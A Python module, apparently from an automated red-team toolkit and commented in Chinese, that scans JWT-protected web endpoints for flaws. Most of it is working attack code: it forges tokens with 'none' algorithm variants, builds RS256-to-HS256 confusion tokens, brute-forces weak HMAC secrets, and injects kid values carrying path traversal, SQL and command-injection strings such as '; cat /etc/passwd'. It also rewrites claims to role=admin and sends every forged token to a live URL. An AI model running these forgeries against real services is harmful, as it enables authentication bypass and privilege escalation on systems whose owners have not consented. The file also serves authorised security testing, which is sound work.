#!/usr/bin/env python3
"""
JWT增强检测模块
功能: None算法攻击、HS256/RS256算法混淆、弱密钥检测、KID注入、过期验证
作者: AutoRedTeam
"""

import base64
import hashlib
import hmac
import json
import logging
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests

logger = logging.getLogger(__name__)

# 统一 HTTP 客户端工厂
try:
    from core.http import get_sync_client
    HAS_HTTP_FACTORY = True
except ImportError:
    HAS_HTTP_FACTORY = False


class JWTVulnType(Enum):
    """JWT漏洞类型"""
    NONE_ALGORITHM = "none_algorithm"           # None算法攻击
    ALGORITHM_CONFUSION = "algorithm_confusion"  # RS256->HS256混淆
    WEAK_SECRET = "weak_secret"                 # 弱密钥
    MISSING_EXPIRY = "missing_expiry"           # 缺少过期时间
    EXPIRED_ACCEPTED = "expired_accepted"       # 接受过期Token
    KID_INJECTION = "kid_injection"             # KID参数注入
    JKU_INJECTION = "jku_injection"             # JKU参数注入
    JWK_INJECTION = "jwk_injection"             # JWK嵌入攻击
    SIGNATURE_NOT_VERIFIED = "signature_not_verified"  # 签名未验证


@dataclass
class JWTVulnerability:
    """JWT漏洞结果"""
    vuln_type: JWTVulnType
    severity: str
    description: str
    original_token: str
    forged_token: str = ""
    proof: str = ""
    remediation: str = ""
    cvss_score: float = 0.0


@dataclass
class JWTInfo:
    """JWT解析信息"""
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: str
    algorithm: str = ""
    is_valid_format: bool = True
    error: str = ""


class JWTSecurityTester:
    """JWT安全测试器"""

    # 常见弱密钥列表 (扩展版)
    WEAK_SECRETS = [
        # 常见默认密钥
        "secret", "password", "123456", "admin", "key", "jwt",
        "jwt_secret", "jwt-secret", "secret123", "password123",
        "changeme", "mysecret", "supersecret", "defaultsecret",
        "your-256-bit-secret", "your-secret-key", "my-secret-key",
        # 框架默认
        "django-insecure-key", "rails_secret", "laravel_secret",
        "express_secret", "flask_secret", "spring_secret",
        # 简单模式
        "1234567890", "0987654321", "qwerty", "letmein",
        "abc123", "test", "demo", "development", "production",
        # 空值和特殊
        "", " ", "null", "undefined", "none",
    ]

    # None算法变体
    NONE_ALGORITHM_VARIANTS = [
        "none", "None", "NONE", "nOnE",
        "none ", " none", "none\t", "\tnone",
    ]

    # KID注入Payloads
    KID_INJECTION_PAYLOADS = [
        # 路径遍历
        ("../../../etc/passwd", "path_traversal"),
        ("....//....//etc/passwd", "path_traversal_bypass"),
        ("/dev/null", "null_file"),
        # SQL注入
        ("' OR '1'='1", "sqli"),
        ("1' AND '1'='1", "sqli"),
        ("' UNION SELECT 'secret' --", "sqli_union"),
        # 命令注入
        ("; cat /etc/passwd", "command_injection"),
        ("| id", "command_injection"),
        ("$(id)", "command_substitution"),
    ]

    def __init__(self, timeout: float = 10.0, proxy: Optional[str] = None):
        """
        初始化JWT测试器

        Args:
            timeout: 请求超时时间
            proxy: 代理地址 (如 http://127.0.0.1:8080)
        """
        self.timeout = timeout
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        # 优先使用统一 HTTP 客户端工厂
        if HAS_HTTP_FACTORY:
            self._session = get_sync_client(proxy=proxy, force_new=True)
        else:
            self._session = requests.Session()
        self._session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })

    @staticmethod
    def base64url_encode(data: bytes) -> str:
        """Base64 URL安全编码"""
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

    @staticmethod
    def base64url_decode(data: str) -> bytes:
        """Base64 URL安全解码"""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)

    def decode_jwt(self, token: str) -> JWTInfo:
        """
        解码JWT (不验证签名)

        Args:
            token: JWT字符串

        Returns:
            JWTInfo对象包含header、payload、signature
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return JWTInfo(
                    header={}, payload={}, signature="",
                    is_valid_format=False,
                    error=f"无效JWT格式: 期望3部分, 得到{len(parts)}部分"
                )

            header = json.loads(self.base64url_decode(parts[0]))
            payload = json.loads(self.base64url_decode(parts[1]))
            signature = parts[2]
            algorithm = header.get('alg', 'unknown')

            return JWTInfo(
                header=header,
                payload=payload,
                signature=signature,
                algorithm=algorithm,
                is_valid_format=True
            )
        except json.JSONDecodeError as e:
            return JWTInfo(
                header={}, payload={}, signature="",
                is_valid_format=False,
                error=f"JSON解析失败: {e}"
            )
        except Exception as e:
            return JWTInfo(
                header={}, payload={}, signature="",
                is_valid_format=False,
                error=f"解码失败: {e}"
            )

    def forge_jwt(self, header: Dict, payload: Dict,
                  signature: str = "") -> str:
        """
        构造JWT

        Args:
            header: JWT头部
            payload: JWT载荷
            signature: 签名 (可选)

        Returns:
            构造的JWT字符串
        """
        header_b64 = self.base64url_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_b64 = self.base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        return f"{header_b64}.{payload_b64}.{signature}"

    def sign_hs256(self, header: Dict, payload: Dict, secret: str) -> str:
        """使用HS256签名JWT"""
        header_b64 = self.base64url_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_b64 = self.base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        message = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(secret.encode(), message, hashlib.sha256).digest()
        return f"{header_b64}.{payload_b64}.{self.base64url_encode(signature)}"

    def _verify_token(self, url: str, token: str,
                      headers: Optional[Dict] = None) -> Tuple[bool, int, str]:
        """
        验证Token是否被服务器接受

        Returns:
            (是否接受, 状态码, 响应摘要)
        """
        test_headers = headers.copy() if headers else {}
        test_headers["Authorization"] = f"Bearer {token}"

        try:
            resp = self._session.get(
                url,
                headers=test_headers,
                timeout=self.timeout,
                proxies=self.proxies,
                allow_redirects=False
            )

            # 判断是否被接受 (非401/403通常表示接受)
            accepted = resp.status_code not in [401, 403]
            summary = resp.text[:200] if resp.text else ""

            return accepted, resp.status_code, summary

        except requests.RequestException as e:
            return False, 0, str(e)

    def test_none_algorithm(self, token: str, url: str = "",
                            headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试None算法攻击

        Args:
            token: 原始JWT
            url: 验证端点URL (可选,用于实际验证)
            headers: 额外的HTTP头

        Returns:
            测试结果字典
        """
        result = {
            "vulnerable": False,
            "vuln_type": "none_algorithm",
            "severity": "critical",
            "description": "JWT使用None算法可导致签名绕过",
            "tests": [],
            "forged_tokens": [],
            "remediation": "在服务端强制验证算法类型,拒绝none算法"
        }

        jwt_info = self.decode_jwt(token)
        if not jwt_info.is_valid_format:
            result["error"] = jwt_info.error
            return result

        # 尝试所有None变体
        for none_variant in self.NONE_ALGORITHM_VARIANTS:
            forged_header = jwt_info.header.copy()
            forged_header['alg'] = none_variant

            # 构造无签名的Token
            forged_token = self.forge_jwt(forged_header, jwt_info.payload, "")
            result["forged_tokens"].append({
                "variant": none_variant,
                "token": forged_token
            })

            test_result = {"variant": none_variant, "token": forged_token}

            if url:
                accepted, status, summary = self._verify_token(url, forged_token, headers)
                test_result["accepted"] = accepted
                test_result["status_code"] = status
                test_result["response_preview"] = summary[:100]

                if accepted:
                    result["vulnerable"] = True
                    result["proof"] = f"服务器接受了alg={none_variant}的Token (HTTP {status})"

            result["tests"].append(test_result)

        return result

    def test_algorithm_confusion(self, token: str, url: str = "",
                                  public_key: str = "",
                                  headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试算法混淆攻击 (RS256 -> HS256)

        将RS256签名的Token改为HS256,使用公钥作为HMAC密钥

        Args:
            token: 原始JWT (应为RS256签名)
            url: 验证端点URL
            public_key: RSA公钥 (PEM格式)
            headers: 额外的HTTP头
        """
        result = {
            "vulnerable": False,
            "vuln_type": "algorithm_confusion",
            "severity": "critical",
            "description": "将RS256改为HS256,使用公钥作为HMAC密钥可绕过签名验证",
            "original_algorithm": "",
            "forged_token": "",
            "remediation": "验证算法类型与预期一致,不依赖header中的alg声明"
        }

        jwt_info = self.decode_jwt(token)
        if not jwt_info.is_valid_format:
            result["error"] = jwt_info.error
            return result

        result["original_algorithm"] = jwt_info.algorithm

        # 检查是否为RS算法
        if not jwt_info.algorithm.upper().startswith('RS'):
            result["skipped"] = True
            result["reason"] = f"原始算法为{jwt_info.algorithm},不适用于此攻击"
            return result

        if not public_key:
            result["skipped"] = True
            result["reason"] = "需要提供公钥进行测试"
            result["hint"] = "可尝试从/.well-known/jwks.json获取公钥"
            return result

        # 构造HS256签名的Token (使用公钥作为secret)
        forged_header = jwt_info.header.copy()
        forged_header['alg'] = 'HS256'

        forged_token = self.sign_hs256(forged_header, jwt_info.payload, public_key)
        result["forged_token"] = forged_token

        if url:
            accepted, status, summary = self._verify_token(url, forged_token, headers)
            result["accepted"] = accepted
            result["status_code"] = status

            if accepted:
                result["vulnerable"] = True
                result["proof"] = f"服务器接受了RS256->HS256混淆的Token (HTTP {status})"

        return result

    def test_weak_secrets(self, token: str,
                          custom_secrets: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        测试弱密钥

        Args:
            token: JWT字符串
            custom_secrets: 自定义密钥列表
        """
        result = {
            "vulnerable": False,
            "vuln_type": "weak_secret",
            "severity": "high",
            "description": "JWT使用弱密钥可被暴力破解",
            "found_secret": "",
            "attempts": 0,
            "remediation": "使用至少256位的随机密钥"
        }

        jwt_info = self.decode_jwt(token)
        if not jwt_info.is_valid_format:
            result["error"] = jwt_info.error
            return result

        # 仅适用于HMAC算法
        if not jwt_info.algorithm.upper().startswith('HS'):
            result["skipped"] = True
            result["reason"] = f"算法{jwt_info.algorithm}不使用对称密钥"
            return result

        secrets_to_try = self.WEAK_SECRETS.copy()
        if custom_secrets:
            secrets_to_try.extend(custom_secrets)

        # 获取原始签名
        parts = token.split('.')
        original_signature = parts[2]
        message = f"{parts[0]}.{parts[1]}".encode()

        for secret in secrets_to_try:
            result["attempts"] += 1

            try:
                # 计算签名
                if jwt_info.algorithm.upper() == 'HS256':
                    computed = hmac.new(secret.encode(), message, hashlib.sha256).digest()
                elif jwt_info.algorithm.upper() == 'HS384':
                    computed = hmac.new(secret.encode(), message, hashlib.sha384).digest()
                elif jwt_info.algorithm.upper() == 'HS512':
                    computed = hmac.new(secret.encode(), message, hashlib.sha512).digest()
                else:
                    continue

                computed_b64 = self.base64url_encode(computed)

                if computed_b64 == original_signature:
                    result["vulnerable"] = True
                    result["found_secret"] = secret if secret else "(空字符串)"
                    result["proof"] = f"密钥'{secret}'可验证签名"
                    break

            except Exception as e:
                logger.debug(f"测试密钥'{secret}'失败: {e}")

        return result

    def test_expiry_bypass(self, token: str, url: str = "",
                           headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试过期Token是否被接受
        """
        result = {
            "vulnerable": False,
            "vuln_type": "expired_accepted",
            "severity": "medium",
            "description": "服务器接受过期的JWT",
            "token_exp": None,
            "is_expired": False,
            "remediation": "服务端必须验证exp声明"
        }

        jwt_info = self.decode_jwt(token)
        if not jwt_info.is_valid_format:
            result["error"] = jwt_info.error
            return result

        exp = jwt_info.payload.get('exp')

        if exp is None:
            result["vuln_type"] = "missing_expiry"
            result["vulnerable"] = True
            result["description"] = "JWT缺少exp过期时间声明"
            result["severity"] = "low"
            return result

        result["token_exp"] = exp
        result["exp_datetime"] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(exp))
        result["is_expired"] = exp < time.time()

        if result["is_expired"] and url:
            accepted, status, _ = self._verify_token(url, token, headers)
            if accepted:
                result["vulnerable"] = True
                result["proof"] = f"过期Token仍被接受 (HTTP {status})"

        return result

    def test_kid_injection(self, token: str, url: str = "",
                           headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试KID参数注入 (路径遍历/SQL注入)
        """
        result = {
            "vulnerable": False,
            "vuln_type": "kid_injection",
            "severity": "high",
            "description": "JWT的kid参数可能存在注入漏洞",
            "original_kid": "",
            "tests": [],
            "remediation": "对kid参数进行严格验证和过滤"
        }

        jwt_info = self.decode_jwt(token)
        if not jwt_info.is_valid_format:
            result["error"] = jwt_info.error
            return result

        original_kid = jwt_info.header.get('kid', '')
        result["original_kid"] = original_kid

        if not url:
            result["skipped"] = True
            result["reason"] = "需要提供URL进行验证"
            # 仍然生成测试Payloads供手动测试
            result["payloads"] = [
                {"kid": p[0], "type": p[1]}
                for p in self.KID_INJECTION_PAYLOADS
            ]
            return result

        for payload, injection_type in self.KID_INJECTION_PAYLOADS:
            forged_header = jwt_info.header.copy()
            forged_header['kid'] = payload

            # 对于/dev/null路径遍历,使用空密钥签名
            if injection_type == "null_file":
                forged_token = self.sign_hs256(forged_header, jwt_info.payload, "")
            else:
                # 其他注入保持原签名
                forged_token = self.forge_jwt(forged_header, jwt_info.payload, jwt_info.signature)

            accepted, status, _ = self._verify_token(url, forged_token, headers)

            test_result = {
                "payload": payload,
                "type": injection_type,
                "accepted": accepted,
                "status_code": status
            }
            result["tests"].append(test_result)

            if accepted:
                result["vulnerable"] = True
                result["proof"] = f"KID注入'{payload}'被接受 (HTTP {status})"

        return result

    def test_signature_verification(self, token: str, url: str = "",
                                     headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        测试签名是否被验证
        """
        result = {
            "vulnerable": False,
            "vuln_type": "signature_not_verified",
            "severity": "critical",
            "description": "服务器未验证JWT签名",
            "remediation": "必须验证JWT签名"
        }

        jwt_info = self.decode_jwt(token)
        if not jwt_info.is_valid_format:
            result["error"] = jwt_info.error
            return result

        if not url:
            result["skipped"] = True
            result["reason"] = "需要提供URL进行验证"
            return result

        # 篡改payload但保持原签名
        tampered_payload = jwt_info.payload.copy()

        # 尝试提权
        if 'role' in tampered_payload:
            tampered_payload['role'] = 'admin'
        if 'admin' in tampered_payload:
            tampered_payload['admin'] = True
        if 'user_id' in tampered_payload:
            tampered_payload['user_id'] = 1

        # 使用原签名构造新Token
        tampered_token = self.forge_jwt(jwt_info.header, tampered_payload, jwt_info.signature)

        accepted, status, _ = self._verify_token(url, tampered_token, headers)

        result["tampered_token"] = tampered_token
        result["accepted"] = accepted
        result["status_code"] = status

        if accepted:
            result["vulnerable"] = True
            result["proof"] = f"篡改的Token被接受 (HTTP {status})"

        return result

    def full_scan(self, token: str, url: str = "",
                  public_key: str = "",
                  custom_secrets: Optional[List[str]] = None,
                  headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        完整JWT安全扫描

        Args:
            token: JWT字符串
            url: 验证端点URL
            public_key: RSA公钥 (用于算法混淆测试)
            custom_secrets: 自定义弱密钥列表
            headers: 额外的HTTP头

        Returns:
            完整扫描结果
        """
        result = {
            "token": token[:50] + "..." if len(token) > 50 else token,
            "url": url,
            "jwt_info": {},
            "vulnerabilities": [],
            "tests": {},
            "summary": {
                "total_tests": 0,
                "vulnerable_count": 0,
                "highest_severity": "none"
            }
        }

        # 解析JWT
        jwt_info = self.decode_jwt(token)
        if not jwt_info.is_valid_format:
            result["error"] = jwt_info.error
            return result

        result["jwt_info"] = {
            "algorithm": jwt_info.algorithm,
            "header": jwt_info.header,
            "payload": jwt_info.payload
        }

        severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0}
        highest_severity = "none"

        # 执行所有测试
        tests = [
            ("none_algorithm", lambda: self.test_none_algorithm(token, url, headers)),
            ("algorithm_confusion", lambda: self.test_algorithm_confusion(token, url, public_key, headers)),
            ("weak_secret", lambda: self.test_weak_secrets(token, custom_secrets)),
            ("expiry_bypass", lambda: self.test_expiry_bypass(token, url, headers)),
            ("kid_injection", lambda: self.test_kid_injection(token, url, headers)),
            ("signature_verification", lambda: self.test_signature_verification(token, url, headers)),
        ]

        for test_name, test_func in tests:
            try:
                test_result = test_func()
                result["tests"][test_name] = test_result
                result["summary"]["total_tests"] += 1

                if test_result.get("vulnerable"):
                    result["summary"]["vulnerable_count"] += 1
                    severity = test_result.get("severity", "low")

                    if severity_order.get(severity, 0) > severity_order.get(highest_severity, 0):
                        highest_severity = severity

                    result["vulnerabilities"].append({
                        "type": test_name,
                        "severity": severity,
                        "proof": test_result.get("proof", ""),
                        "remediation": test_result.get("remediation", "")
                    })

            except Exception as e:
                logger.error(f"测试{test_name}失败: {e}")
                result["tests"][test_name] = {"error": str(e)}

        result["summary"]["highest_severity"] = highest_severity

        return result


# 便捷函数
def quick_jwt_scan(token: str, url: str = "") -> Dict[str, Any]:
    """快速JWT安全扫描"""
    tester = JWTSecurityTester()
    return tester.full_scan(token, url)


if __name__ == "__main__":
    # 测试示例
    test_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

    tester = JWTSecurityTester()

    # 测试解码
    info = tester.decode_jwt(test_token)
    print(f"Algorithm: {info.algorithm}")
    print(f"Payload: {info.payload}")

    # 测试弱密钥
    weak_result = tester.test_weak_secrets(test_token)
    print(f"Weak secret found: {weak_result.get('found_secret', 'None')}")
